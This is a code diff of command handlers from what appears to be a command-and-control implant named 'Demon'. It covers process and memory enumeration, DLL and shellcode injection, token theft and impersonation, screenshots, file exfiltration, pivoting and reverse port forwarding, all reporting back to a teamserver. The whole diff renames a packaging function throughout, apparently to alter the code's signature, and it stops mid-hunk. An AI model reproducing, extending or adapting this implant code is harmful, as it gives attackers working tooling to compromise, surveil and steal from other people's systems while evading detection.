@@ -180,8 +180,8 @@ VOID CommandSleep( PPARSER Parser )
     PRINTF( "Instance->Sleeping: [%d]\n", Instance->Config.Sleeping );
     PRINTF( "Instance->Jitter  : [%d]\n", Instance->Config.Jitter );
 
-    PackageAddInt32( Package, Instance->Config.Sleeping );
-    PackageAddInt32( Package, Instance->Config.Jitter );
+    PkgAdIn32( Package, Instance->Config.Sleeping );
+    PkgAdIn32( Package, Instance->Config.Jitter );
     PackageTransmit( Package );
 }
 
@@ -191,7 +191,7 @@ VOID CommandJob( PPARSER Parser )
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_JOB );
     DWORD    Command = ParserGetInt32( Parser );
 
-    PackageAddInt32( Package, Command );
+    PkgAdIn32( Package, Command );
 
     switch ( Command )
     {
@@ -205,9 +205,9 @@ VOID CommandJob( PPARSER Parser )
                 {
                     PRINTF( "Job => JobID:[%d] Type:[%d] State:[%d]\n", JobList->JobID, JobList->Type, JobList->State )
 
-                    PackageAddInt32( Package, JobList->JobID );
-                    PackageAddInt32( Package, JobList->Type );
-                    PackageAddInt32( Package, JobList->State );
+                    PkgAdIn32( Package, JobList->JobID );
+                    PkgAdIn32( Package, JobList->Type );
+                    PkgAdIn32( Package, JobList->State );
 
                     JobList = JobList->Next;
                 } else
@@ -226,8 +226,8 @@ VOID CommandJob( PPARSER Parser )
 
             PRINTF( "JobID:[%d] Success:[%d]", JobID, Success )
 
-            PackageAddInt32( Package, JobID   );
-            PackageAddInt32( Package, Success );
+            PkgAdIn32( Package, JobID   );
+            PkgAdIn32( Package, Success );
 
             break;
         }
@@ -238,8 +238,8 @@ VOID CommandJob( PPARSER Parser )
             DWORD JobID   = ParserGetInt32( Parser );
             BOOL  Success = JobResume( JobID );
 
-            PackageAddInt32( Package, JobID   );
-            PackageAddInt32( Package, Success );
+            PkgAdIn32( Package, JobID   );
+            PkgAdIn32( Package, Success );
 
             break;
         }
@@ -250,8 +250,8 @@ VOID CommandJob( PPARSER Parser )
             DWORD JobID   = ParserGetInt32( Parser );
             BOOL  Success = JobKill( JobID );
 
-            PackageAddInt32( Package, JobID   );
-            PackageAddInt32( Package, Success );
+            PkgAdIn32( Package, JobID   );
+            PkgAdIn32( Package, Success );
 
             break;
         }
@@ -265,7 +265,7 @@ VOID CommandProc( PPARSER Parser )
     SHORT       SubCommand  = ( SHORT ) ParserGetInt32( Parser );
     PPACKAGE    Package     = PackageCreate( DEMON_COMMAND_PROC );
 
-    PackageAddInt32( Package, SubCommand );
+    PkgAdIn32( Package, SubCommand );
 
     switch ( SubCommand )
     {
@@ -295,7 +295,7 @@ VOID CommandProc( PPARSER Parser )
                 WCHAR                   ModuleNameW[ MAX_PATH ] = { 0 };
                 CHAR                    ModuleName[ MAX_PATH ]  = { 0 };
 
-                PackageAddInt32( Package, ProcessID );
+                PkgAdIn32( Package, ProcessID );
 
                 if ( NT_SUCCESS( SysNtReadVirtualMemory( hProcess, &ProcessBasicInfo.PebBaseAddress->Ldr, &LoaderData, sizeof( PPEB_LDR_DATA ), &Size ) ) )
                 {
@@ -375,10 +375,10 @@ VOID CommandProc( PPARSER Parser )
                         }
 
                         PackageAddWString( Package, SysProcessInfo->ImageName.Buffer );
-                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId  );
-                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->InheritedFromUniqueProcessId );
+                        PkgAdIn32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId  );
+                        PkgAdIn32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->InheritedFromUniqueProcessId );
                         PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
-                        PackageAddInt32( Package, ProcessIsWow( hProcess ) ? 86 : 64 );
+                        PkgAdIn32( Package, ProcessIsWow( hProcess ) ? 86 : 64 );
 
                         if ( hProcess ) {
                             SysNtClose( hProcess );
@@ -448,10 +448,10 @@ VOID CommandProc( PPARSER Parser )
             Success = ProcessCreate( TRUE, Process, ProcessArgs, ProcessState, &ProcessInfo, ProcessPiped, NULL );
 
             PackageAddWString( Package, Process );
-            PackageAddInt32( Package, Success ? ProcessInfo.dwProcessId : 0 );
-            PackageAddInt32( Package, Success );
-            PackageAddInt32( Package, ProcessPiped );
-            PackageAddInt32( Package, ProcessVerbose );
+            PkgAdIn32( Package, Success ? ProcessInfo.dwProcessId : 0 );
+            PkgAdIn32( Package, Success );
+            PkgAdIn32( Package, ProcessPiped );
+            PkgAdIn32( Package, ProcessVerbose );
 
             if ( Success )
             {
@@ -477,8 +477,8 @@ VOID CommandProc( PPARSER Parser )
             hProcess = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
             if ( hProcess )
             {
-                PackageAddInt32( Package, ProcessID );
-                PackageAddInt32( Package, QueryProtec );
+                PkgAdIn32( Package, ProcessID );
+                PkgAdIn32( Package, QueryProtec );
 
                 while ( NT_SUCCESS( SysNtQueryVirtualMemory( hProcess, Offset, MemoryBasicInformation, &MemInfo, sizeof( MemInfo ), &Result ) ) )
                 {
@@ -492,10 +492,10 @@ VOID CommandProc( PPARSER Parser )
                             {
                                 // Since the Protection to query isn't specified we just list every memory region
                                 PackageAddPtr( Package, MemInfo.BaseAddress );
-                                PackageAddInt32( Package, MemInfo.RegionSize );
-                                PackageAddInt32( Package, MemInfo.AllocationProtect );
-                                PackageAddInt32( Package, MemInfo.State );
-                                PackageAddInt32( Package, MemInfo.Type );
+                                PkgAdIn32( Package, MemInfo.RegionSize );
+                                PkgAdIn32( Package, MemInfo.AllocationProtect );
+                                PkgAdIn32( Package, MemInfo.State );
+                                PkgAdIn32( Package, MemInfo.Type );
                             }
                             else
                             {
@@ -504,10 +504,10 @@ VOID CommandProc( PPARSER Parser )
                                     PRINTF( "Search for memory region: %d\n", QueryProtec )
                                     // Add found memory region with specified memory protection
                                     PackageAddPtr( Package, MemInfo.BaseAddress );
-                                    PackageAddInt32( Package, MemInfo.RegionSize );
-                                    PackageAddInt32( Package, MemInfo.AllocationProtect );
-                                    PackageAddInt32( Package, MemInfo.State );
-                                    PackageAddInt32( Package, MemInfo.Type );
+                                    PkgAdIn32( Package, MemInfo.RegionSize );
+                                    PkgAdIn32( Package, MemInfo.AllocationProtect );
+                                    PkgAdIn32( Package, MemInfo.State );
+                                    PkgAdIn32( Package, MemInfo.Type );
                                 }
                             }
                         }
@@ -534,8 +534,8 @@ VOID CommandProc( PPARSER Parser )
             if ( hProcess )
                 Instance->Win32.TerminateProcess( hProcess, 0 );
 
-            PackageAddInt32( Package, hProcess ? TRUE : FALSE );
-            PackageAddInt32( Package, dwProcessID );
+            PkgAdIn32( Package, hProcess ? TRUE : FALSE );
+            PkgAdIn32( Package, dwProcessID );
 
             if ( hProcess )
             {
@@ -586,7 +586,7 @@ VOID CommandProcList(
         ProcessUI = ParserGetInt32( Parser ); /* TODO: change from bool to process list id (what client requested it) */
 
         /* did we get this request from the Client Process Explorer or Console ? */
-        PackageAddInt32( Package, ProcessUI );
+        PkgAdIn32( Package, ProcessUI );
 
         do {
             /* open handle to each process with query information privilege since we don't need anything else besides basic info */
@@ -616,11 +616,11 @@ VOID CommandProcList(
 
             /* Now we append the collected process data to the process list  */
             PackageAddBytes( Package, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
-            PackageAddInt32( Package, U_PTR( SysProcessInfo->UniqueProcessId ) );
-            PackageAddInt32( Package, x86 );
-            PackageAddInt32( Package, U_PTR( SysProcessInfo->InheritedFromUniqueProcessId ) );
-            PackageAddInt32( Package, SysProcessInfo->SessionId );
-            PackageAddInt32( Package, SysProcessInfo->NumberOfThreads );
+            PkgAdIn32( Package, U_PTR( SysProcessInfo->UniqueProcessId ) );
+            PkgAdIn32( Package, x86 );
+            PkgAdIn32( Package, U_PTR( SysProcessInfo->InheritedFromUniqueProcessId ) );
+            PkgAdIn32( Package, SysProcessInfo->SessionId );
+            PkgAdIn32( Package, SysProcessInfo->NumberOfThreads );
             PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
 
 #ifdef DEBUG
@@ -677,7 +677,7 @@ VOID CommandFS( PPARSER Parser )
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_FS );
     DWORD    Command = ParserGetInt32( Parser );
 
-    PackageAddInt32( Package, Command );
+    PkgAdIn32( Package, Command );
 
     switch ( Command )
     {
@@ -755,8 +755,8 @@ VOID CommandFS( PPARSER Parser )
                 if ( ! ( ListOnly && RootDir->NumFiles + RootDir->NumFolders == 0 ) )
                 {
                     PackageAddWString( Package, RootDir->Path );
-                    PackageAddInt32( Package, RootDir->NumFiles );
-                    PackageAddInt32( Package, RootDir->NumFolders );
+                    PkgAdIn32( Package, RootDir->NumFiles );
+                    PkgAdIn32( Package, RootDir->NumFolders );
                     if ( ! ListOnly ) {
                         PackageAddInt64( Package, RootDir->TotalFileSize );
                     }
@@ -768,11 +768,11 @@ VOID CommandFS( PPARSER Parser )
                         if ( ! ListOnly ) {
                             PackageAddBool( Package, DirOrFile->IsDir );
                             PackageAddInt64( Package, DirOrFile->Size );
-                            PackageAddInt32( Package, DirOrFile->FileTime.wDay );
-                            PackageAddInt32( Package, DirOrFile->FileTime.wMonth );
-                            PackageAddInt32( Package, DirOrFile->FileTime.wYear );
-                            PackageAddInt32( Package, DirOrFile->SystemTime.wMinute );
-                            PackageAddInt32( Package, DirOrFile->SystemTime.wHour );
+                            PkgAdIn32( Package, DirOrFile->FileTime.wDay );
+                            PkgAdIn32( Package, DirOrFile->FileTime.wMonth );
+                            PkgAdIn32( Package, DirOrFile->FileTime.wYear );
+                            PkgAdIn32( Package, DirOrFile->SystemTime.wMinute );
+                            PkgAdIn32( Package, DirOrFile->SystemTime.wHour );
                         }
 
                         TmpDirOrFile = DirOrFile->Next;
@@ -853,8 +853,8 @@ VOID CommandFS( PPARSER Parser )
 			 * */
 
             /* Download Header */
-            PackageAddInt32( Package, DOWNLOAD_MODE_OPEN );
-            PackageAddInt32( Package, Download->FileID   );
+            PkgAdIn32( Package, DOWNLOAD_MODE_OPEN );
+            PkgAdIn32( Package, Download->FileID   );
 
             /* Download Open Data */
             PackageAddInt64( Package, FileSize.QuadPart );
@@ -930,7 +930,7 @@ VOID CommandFS( PPARSER Parser )
                 goto CleanupUpload;
             }
 
-            PackageAddInt32( Package, FileSize );
+            PkgAdIn32( Package, FileSize );
             PackageAddWString( Package, FileName );
 
         CleanupUpload:
@@ -973,7 +973,7 @@ VOID CommandFS( PPARSER Parser )
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                     goto CLEAR_LEAVE;
                 } else {
-                    PackageAddInt32( Package, TRUE );
+                    PkgAdIn32( Package, TRUE );
                 }
             }
             else
@@ -982,7 +982,7 @@ VOID CommandFS( PPARSER Parser )
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                     goto CLEAR_LEAVE;
                 } else {
-                    PackageAddInt32( Package, FALSE );
+                    PkgAdIn32( Package, FALSE );
                 }
             }
 
@@ -1025,7 +1025,7 @@ VOID CommandFS( PPARSER Parser )
                 PACKAGE_ERROR_WIN32
             }
 
-            PackageAddInt32( Package, Success );
+            PkgAdIn32( Package, Success );
             PackageAddWString( Package, PathFrom );
             PackageAddWString( Package, PathTo );
 
@@ -1050,7 +1050,7 @@ VOID CommandFS( PPARSER Parser )
                 PACKAGE_ERROR_WIN32
             }
 
-            PackageAddInt32( Package, Success );
+            PkgAdIn32( Package, Success );
             PackageAddWString( Package, PathFrom );
             PackageAddWString( Package, PathTo );
 
@@ -1085,7 +1085,7 @@ VOID CommandFS( PPARSER Parser )
             Success = ReadLocalFile( FileName, &Content, &FileSize );
 
             PackageAddWString( Package, FileName );
-            PackageAddInt32( Package, Success );
+            PkgAdIn32( Package, Success );
             PackageAddBytes( Package, Content,  FileSize );
 
             if ( Content )
@@ -1240,7 +1240,7 @@ VOID CommandInjectDLL( PPARSER Parser )
 
     PRINTF( "Injected Result: %d\n", Result )
 
-    PackageAddInt32( Package, Result );
+    PkgAdIn32( Package, Result );
     PackageTransmit( Package );
 }
 
@@ -1259,7 +1259,7 @@ VOID CommandSpawnDLL( PPARSER Parser )
     Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );
     Result  = DllSpawnReflective( DllLdr, DllLdrSize, DllBytes, DllSize, Arguments, ArgSize, &InjCtx );
 
-    PackageAddInt32( Package, Result );
+    PkgAdIn32( Package, Result );
     PackageTransmit( Package );
 }
 
@@ -1366,7 +1366,7 @@ VOID CommandInjectShellcode(
     }
 
 
-    PackageAddInt32( Package, Status );
+    PkgAdIn32( Package, Status );
     PackageTransmit( Package );
 }
 
@@ -1377,7 +1377,7 @@ VOID CommandToken( PPARSER Parser )
 
     PRINTF( "Command => %d\n", Command )
 
-    PackageAddInt32( Package, Command );
+    PkgAdIn32( Package, Command );
     switch ( Command )
     {
         case DEMON_COMMAND_TOKEN_IMPERSONATE: PUTS( "Token::Impersonate" )
@@ -1389,15 +1389,15 @@ VOID CommandToken( PPARSER Parser )
 
             if ( TokenData )
             {
-                PackageAddInt32( Package, ImpersonateTokenInStore( TokenData ) );
+                PkgAdIn32( Package, ImpersonateTokenInStore( TokenData ) );
                 PackageAddString( Package, TokenData->DomainUser );
             }
             else
             {
                 PUTS( "Token not found in vault." )
                 PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
-                PackageAddInt32( Package, FALSE );
-                PackageAddInt32( Package, 0 );
+                PkgAdIn32( Package, FALSE );
+                PkgAdIn32( Package, 0 );
             }
 
             break;
@@ -1441,8 +1441,8 @@ VOID CommandToken( PPARSER Parser )
             PRINTF( "[^] New Token added to the Vault: %d User:[%ls]\n", NewTokenID, UserDomain.Buffer );
 
             PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
-            PackageAddInt32( Package, NewTokenID );
-            PackageAddInt32( Package, TargetPid );
+            PkgAdIn32( Package, NewTokenID );
+            PkgAdIn32( Package, TargetPid );
 
             break;
         }
@@ -1457,12 +1457,12 @@ VOID CommandToken( PPARSER Parser )
                 {
                     PRINTF( "[TOKEN_LIST] Index:[%d] Handle:[0x%x] User:[%s] Pid:[%d]\n", TokenIndex, TokenList->Handle, TokenList->DomainUser, TokenList->dwProcessID );
 
-                    PackageAddInt32( Package, TokenIndex );
-                    PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList->Handle );
+                    PkgAdIn32( Package, TokenIndex );
+                    PkgAdIn32( Package, ( DWORD ) ( ULONG_PTR ) TokenList->Handle );
                     PackageAddWString( Package, TokenList->DomainUser );
-                    PackageAddInt32( Package, TokenList->dwProcessID );
-                    PackageAddInt32( Package, TokenList->Type );
-                    PackageAddInt32( Package, Instance->Tokens.Impersonate && Instance->Tokens.Token->Handle == TokenList->Handle );
+                    PkgAdIn32( Package, TokenList->dwProcessID );
+                    PkgAdIn32( Package, TokenList->Type );
+                    PkgAdIn32( Package, Instance->Tokens.Impersonate && Instance->Tokens.Token->Handle == TokenList->Handle );
 
                     TokenList = TokenList->NextToken;
                 }
@@ -1484,7 +1484,7 @@ VOID CommandToken( PPARSER Parser )
             UINT32            PrivNameLength = 0;
             BOOL              ListPrivs      = ParserGetInt32( Parser );
 
-            PackageAddInt32( Package, ListPrivs );
+            PkgAdIn32( Package, ListPrivs );
 
             if ( ListPrivs )
             {
@@ -1505,7 +1505,7 @@ VOID CommandToken( PPARSER Parser )
                             Length = MAX_PATH;
                             Instance->Win32.LookupPrivilegeNameA( NULL, &TokenPrivs->Privileges[ i ].Luid, Name, &Length );
                             PackageAddString( Package, Name );
-                            PackageAddInt32( Package, TokenPrivs->Privileges[ i ].Attributes );
+                            PkgAdIn32( Package, TokenPrivs->Privileges[ i ].Attributes );
                         }
                     }
                 }
@@ -1515,7 +1515,7 @@ VOID CommandToken( PPARSER Parser )
                 PUTS( "Privs::Get" )
                 PrivName = ParserGetString( Parser, &PrivNameLength );
 
-                PackageAddInt32( Package, TokenSetPrivilege( PrivName, TRUE ) );
+                PkgAdIn32( Package, TokenSetPrivilege( PrivName, TRUE ) );
                 PackageAddString( Package, PrivName );
             }
 
@@ -1601,7 +1601,7 @@ VOID CommandToken( PPARSER Parser )
             /* current handle */
             if ( ( Token = TokenCurrentHandle() ) ) {
                 /* query if token is elevated and add it to the package */
-                PackageAddInt32( Package, TokenElevated( Token ) );
+                PkgAdIn32( Package, TokenElevated( Token ) );
 
                 /* query the user of from the current thread/process token */
                 if ( TokenQueryOwner( Token, &User, TOKEN_OWNER_FLAG_DEFAULT ) ) {
@@ -1636,7 +1636,7 @@ VOID CommandToken( PPARSER Parser )
         {
             BOOL Success = TokenRevSelf();
 
-            PackageAddInt32( Package, Success );
+            PkgAdIn32( Package, Success );
 
             if ( ! Success )
                 PACKAGE_ERROR_WIN32;
@@ -1651,8 +1651,8 @@ VOID CommandToken( PPARSER Parser )
         {
             DWORD TokenID = ParserGetInt32( Parser );
 
-            PackageAddInt32( Package, TokenRemove( TokenID ) );
-            PackageAddInt32( Package, TokenID );
+            PkgAdIn32( Package, TokenRemove( TokenID ) );
+            PkgAdIn32( Package, TokenID );
 
             break;
         }
@@ -1676,20 +1676,20 @@ VOID CommandToken( PPARSER Parser )
 
             Success = ListTokens( &TokenList, &NumTokens );
 
-            PackageAddInt32( Package, Success );
+            PkgAdIn32( Package, Success );
 
             if ( Success )
             {
-                PackageAddInt32( Package, NumTokens );
+                PkgAdIn32( Package, NumTokens );
 
                 for (i = 0; i < NumTokens; ++i)
                 {
                     PackageAddWString( Package, TokenList[ i ].username );
-                    PackageAddInt32( Package, TokenList[ i ].dwProcessID );
-                    PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
-                    PackageAddInt32( Package, TokenList[ i ].integrity_level );
-                    PackageAddInt32( Package, TokenList[ i ].impersonation_level );
-                    PackageAddInt32( Package, TokenList[ i ].TokenType );
+                    PkgAdIn32( Package, TokenList[ i ].dwProcessID );
+                    PkgAdIn32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
+                    PkgAdIn32( Package, TokenList[ i ].integrity_level );
+                    PkgAdIn32( Package, TokenList[ i ].impersonation_level );
+                    PkgAdIn32( Package, TokenList[ i ].TokenType );
                 }
             }
 
@@ -1775,7 +1775,7 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
         if ( ! DotnetExecute( AssemblyData, AssemblyArgs ) )
         {
             PPACKAGE Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
-            PackageAddInt32( Package, DOTNET_INFO_FAILED );
+            PkgAdIn32( Package, DOTNET_INFO_FAILED );
             PackageTransmit( Package );
 
             DotnetClose();
@@ -1867,7 +1867,7 @@ VOID CommandConfig( PPARSER Parser )
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_CONFIG );
     UINT32   Config  = ParserGetInt32( Parser );
 
-    PackageAddInt32( Package, Config );
+    PkgAdIn32( Package, Config );
 
     switch ( Config )
     {
@@ -1921,49 +1921,49 @@ VOID CommandConfig( PPARSER Parser )
         {
             Instance->Config.Implant.SleepMaskTechnique = ParserGetInt32( Parser );
             PRINTF( "Set sleep obfuscation technique to %d\n", Instance->Config.Implant.SleepMaskTechnique )
-            PackageAddInt32( Package, Instance->Config.Implant.SleepMaskTechnique );
+            PkgAdIn32( Package, Instance->Config.Implant.SleepMaskTechnique );
             break;
         }
 
         case DEMON_CONFIG_IMPLANT_VERBOSE:
         {
             Instance->Config.Implant.Verbose = ParserGetInt32( Parser );
-            PackageAddInt32( Package, Instance->Config.Implant.Verbose );
+            PkgAdIn32( Package, Instance->Config.Implant.Verbose );
             break;
         }
 
         case DEMON_CONFIG_IMPLANT_COFFEE_VEH:
         {
             Instance->Config.Implant.CoffeeVeh = ParserGetInt32( Parser );
-            PackageAddInt32( Package, Instance->Config.Implant.CoffeeVeh );
+            PkgAdIn32( Package, Instance->Config.Implant.CoffeeVeh );
             break;
         }
 
         case DEMON_CONFIG_IMPLANT_COFFEE_THREADED:
         {
             Instance->Config.Implant.CoffeeThreaded = ParserGetInt32( Parser );
-            PackageAddInt32( Package, Instance->Config.Implant.CoffeeThreaded );
+            PkgAdIn32( Package, Instance->Config.Implant.CoffeeThreaded );
             break;
         }
 
         case DEMON_CONFIG_MEMORY_ALLOC:
         {
             Instance->Config.Memory.Alloc = ParserGetInt32( Parser );
-            PackageAddInt32( Package, Instance->Config.Memory.Alloc );
+            PkgAdIn32( Package, Instance->Config.Memory.Alloc );
             break;
         }
 
         case DEMON_CONFIG_MEMORY_EXECUTE:
         {
             Instance->Config.Memory.Execute = ParserGetInt32( Parser );
-            PackageAddInt32( Package, Instance->Config.Memory.Execute );
+            PkgAdIn32( Package, Instance->Config.Memory.Execute );
             break;
         }
 
         case DEMON_CONFIG_INJECTION_TECHNIQUE:
         {
             Instance->Config.Inject.Technique = ParserGetInt32( Parser );
-            PackageAddInt32( Package, Instance->Config.Inject.Technique );
+            PkgAdIn32( Package, Instance->Config.Inject.Technique );
             break;
         }
 
@@ -2068,13 +2068,13 @@ VOID CommandConfig( PPARSER Parser )
             Instance->Config.Transport.WorkingHours = ParserGetInt32( Parser );
 
             PRINTF( "Instance->Config.Transport.WorkingHours => %d\n", Instance->Config.Transport.WorkingHours );
-            PackageAddInt32( Package, Instance->Config.Transport.WorkingHours );
+            PkgAdIn32( Package, Instance->Config.Transport.WorkingHours );
 
             break;
         }
 
         default:
-            PackageAddInt32( Package, 0 );
+            PkgAdIn32( Package, 0 );
             break;
     }
 
@@ -2093,13 +2093,13 @@ VOID CommandScreenshot( PPARSER Parser )
     if ( WinScreenshot( &Image, &Size ) )
     {
         PUTS( "Successful took screenshot" )
-        PackageAddInt32( Package, TRUE );
+        PkgAdIn32( Package, TRUE );
         PackageAddBytes( Package, Image, Size );
     }
     else
     {
         PUTS( "Failed to take screenshot" )
-        PackageAddInt32( Package, FALSE );
+        PkgAdIn32( Package, FALSE );
     }
 
     PackageTransmit( Package );
@@ -2112,7 +2112,7 @@ VOID CommandNet( PPARSER Parser )
     PPACKAGE Package    = PackageCreate( DEMON_COMMAND_NET );
     UINT32   NetCommand = ParserGetInt32( Parser );
 
-    PackageAddInt32( Package, NetCommand );
+    PkgAdIn32( Package, NetCommand );
 
     switch ( NetCommand )
     {
@@ -2242,8 +2242,8 @@ VOID CommandNet( PPARSER Parser )
 
                         PackageAddWString( Package, SessionInfo[i].sesi10_username );
                         PackageAddWString( Package, SessionInfo[i].sesi10_username );
-                        PackageAddInt32( Package, SessionInfo[i].sesi10_time );
-                        PackageAddInt32( Package, SessionInfo[i].sesi10_idle_time );
+                        PkgAdIn32( Package, SessionInfo[i].sesi10_time );
+                        PkgAdIn32( Package, SessionInfo[i].sesi10_idle_time );
                     }
                 }
                 else
@@ -2314,7 +2314,7 @@ VOID CommandNet( PPARSER Parser )
                         PackageAddWString( Package, ShareInfo[i].shi502_netname );
                         PackageAddWString( Package, ShareInfo[i].shi502_path );
                         PackageAddWString( Package, ShareInfo[i].shi502_remark );
-                        PackageAddInt32( Package, ShareInfo[i].shi502_permissions );
+                        PkgAdIn32( Package, ShareInfo[i].shi502_permissions );
                     }
 
                     Instance->Win32.NetApiBufferFree( ShareInfo );
@@ -2431,7 +2431,7 @@ VOID CommandNet( PPARSER Parser )
                     if ( UserInfo[ i ].usri0_name )
                     {
                         PackageAddWString( Package, UserInfo[ i ].usri0_name );
-                        PackageAddInt32( Package, FALSE ); // TODO: fix this.
+                        PkgAdIn32( Package, FALSE ); // TODO: fix this.
                     }
                 }
 
@@ -2465,7 +2465,7 @@ VOID CommandPivot( PPARSER Parser )
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_PIVOT );
     DWORD    Pivot   = ParserGetInt32( Parser );
 
-    PackageAddInt32( Package, Pivot );
+    PkgAdIn32( Package, Pivot );
 
     PRINTF( "Pivot => %d\n", Pivot );
 
@@ -2482,7 +2482,7 @@ VOID CommandPivot( PPARSER Parser )
                 {
                     PRINTF( "Pivot List => DemonId:[%x] Named Pipe:[%ls]\n", TempList->DemonID, TempList->PipeName.Buffer )
 
-                    PackageAddInt32( Package, TempList->DemonID );
+                    PkgAdIn32( Package, TempList->DemonID );
                     PackageAddWString( Package, TempList->PipeName.Buffer );
 
                     TempList = TempList->Next;
@@ -2507,7 +2507,7 @@ VOID CommandPivot( PPARSER Parser )
             {
                 PRINTF( "Successful connected: %x : %d\n", Output, BytesSize )
 
-                PackageAddInt32( Package, TRUE );
+                PkgAdIn32( Package, TRUE );
                 PackageAddBytes( Package, Output, BytesSize );
 
                 MemSet( Output, 0, BytesSize );
@@ -2532,8 +2532,8 @@ VOID CommandPivot( PPARSER Parser )
             else
             {
                 PUTS( "Failed to connect" )
-                PackageAddInt32( Package, FALSE );
-                PackageAddInt32( Package, NtGetLastError() );
+                PkgAdIn32( Package, FALSE );
+                PkgAdIn32( Package, NtGetLastError() );
             }
 
             break;
@@ -2546,8 +2546,8 @@ VOID CommandPivot( PPARSER Parser )
 
             Success = PivotRemove( AgentID );
 
-            PackageAddInt32( Package, Success );
-            PackageAddInt32( Package, AgentID );
+            PkgAdIn32( Package, Success );
+            PkgAdIn32( Package, AgentID );
 
             break;
         }
@@ -2617,7 +2617,7 @@ VOID CommandTransfer( PPARSER Parser )
     Command  = ParserGetInt32( Parser );
     Download = Instance->Downloads;
 
-    PackageAddInt32( Package, Command );
+    PkgAdIn32( Package, Command );
 
     switch ( Command )
     {
@@ -2629,9 +2629,9 @@ VOID CommandTransfer( PPARSER Parser )
                     break;
 
                 /* Add download data */
-                PackageAddInt32( Package, Download->FileID   );
-                PackageAddInt32( Package, Download->ReadSize );
-                PackageAddInt32( Package, Download->State    );
+                PkgAdIn32( Package, Download->FileID   );
+                PkgAdIn32( Package, Download->ReadSize );
+                PkgAdIn32( Package, Download->State    );
 
                 Download = Download->Next;
             }
@@ -2659,8 +2659,8 @@ VOID CommandTransfer( PPARSER Parser )
                 Download = Download->Next;
             }
 
-            PackageAddInt32( Package, Found  );
-            PackageAddInt32( Package, FileID );
+            PkgAdIn32( Package, Found  );
+            PkgAdIn32( Package, FileID );
 
             break;
         }
@@ -2687,8 +2687,8 @@ VOID CommandTransfer( PPARSER Parser )
             }
 
             /* Tell us if we managed to find and resume the download */
-            PackageAddInt32( Package, Found  );
-            PackageAddInt32( Package, FileID );
+            PkgAdIn32( Package, Found  );
+            PkgAdIn32( Package, FileID );
 
             break;
         }
@@ -2715,16 +2715,16 @@ VOID CommandTransfer( PPARSER Parser )
             }
 
             /* Tell us if we managed to find and resume the download */
-            PackageAddInt32( Package, Found  );
-            PackageAddInt32( Package, FileID );
+            PkgAdIn32( Package, Found  );
+            PkgAdIn32( Package, FileID );
 
             /* Tell the server to close the file. Only if we found the download */
             if ( Found )
             {
                 PPACKAGE Package2 = PackageCreate( DEMON_COMMAND_TRANSFER );
-                PackageAddInt32( Package2, Command );
-                PackageAddInt32( Package2, FileID );
-                PackageAddInt32( Package2, DOWNLOAD_REASON_REMOVED );
+                PkgAdIn32( Package2, Command );
+                PkgAdIn32( Package2, FileID );
+                PkgAdIn32( Package2, DOWNLOAD_REASON_REMOVED );
                 PackageTransmit( Package2 );
                 Package2 = NULL;
             }
@@ -2745,7 +2745,7 @@ VOID CommandSocket( PPARSER Parser )
     Package = PackageCreate( DEMON_COMMAND_SOCKET );
     Command = ParserGetInt32( Parser );
 
-    PackageAddInt32( Package, Command );
+    PkgAdIn32( Package, Command );
     switch ( Command )
     {
         case SOCKET_COMMAND_RPORTFWD_ADD: PUTS( "Socket::RPortFwdAdd" )
@@ -2769,16 +2769,16 @@ VOID CommandSocket( PPARSER Parser )
             Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PORTFWD, TRUE, LclAddr, NULL, LclPort, FwdAddr, FwdPort, 0 );
 
             /* if Socket is not NULL then we managed to start a socket. */
-            PackageAddInt32( Package, Socket ? TRUE : FALSE );
-            PackageAddInt32( Package, Socket ? Socket->ID : 0 );
+            PkgAdIn32( Package, Socket ? TRUE : FALSE );
+            PkgAdIn32( Package, Socket ? Socket->ID : 0 );
 
             /* Add our Bind Host & Port data */
-            PackageAddInt32( Package, LclAddr );
-            PackageAddInt32( Package, LclPort );
+            PkgAdIn32( Package, LclAddr );
+            PkgAdIn32( Package, LclPort );
 
             /* Add our Forward Host & Port data */
-            PackageAddInt32( Package, FwdAddr );
-            PackageAddInt32( Package, FwdPort );
+            PkgAdIn32( Package, FwdAddr );
+            PkgAdIn32( Package, FwdPort );
 
             break;
         }
@@ -2799,15 +2799,15 @@ VOID CommandSocket( PPARSER Parser )
 
                 if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
                 {
-                    PackageAddInt32( Package, Socket->ID );
+                    PkgAdIn32( Package, Socket->ID );
 
                     /* Add our Bind Host & Port data */
-                    PackageAddInt32( Package, Socket->IPv4 );
-                    PackageAddInt32( Package, Socket->LclPort );
+                    PkgAdIn32( Package, Socket->IPv4 );
+                    PkgAdIn32( Package, Socket->LclPort );
 
                     /* Add our Forward Host & Port data */
-                    PackageAddInt32( Package, Socket->FwdAddr );
-                    PackageAddInt32( Package, Socket->FwdPort );
+                    PkgAdIn32( Package, Socket->FwdAddr );
+                    PkgAdIn32( Package, Socket->FwdPort );
                 }
 
                 Socket = Socket->Next;
@@ -2932,10 +2932,10 @@ VOID CommandSocket( PPARSER Parser )
             else
             {
                 /* report the error to the teamserver */
-                PackageAddInt32( Package, SocketID );
-                PackageAddInt32( Package, Type );
-                PackageAddInt32( Package, FALSE );
-                PackageAddInt32( Package, Instance->Win32.WSAGetLastError() );
+                PkgAdIn32( Package, SocketID );
